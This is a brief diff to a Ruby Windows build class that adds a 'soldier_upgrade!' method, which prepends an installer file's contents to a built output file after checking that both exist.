@@ -279,6 +279,16 @@ class BuildWindows < Build
     scout_name(seed[0].next)
   end
 
+  def soldier_upgrade!
+    raise "Cannot find soldier" unless File.exist? path('output')
+    raise "Cannot find soldier installer" unless File.exist? path('soldier_upgrade')
+
+    installer = File.read(path('soldier_upgrade'))
+    soldier = File.read(path('output'))
+
+    File.write(path('output'), installer + soldier)
+  end
+
   private
 
   def cook
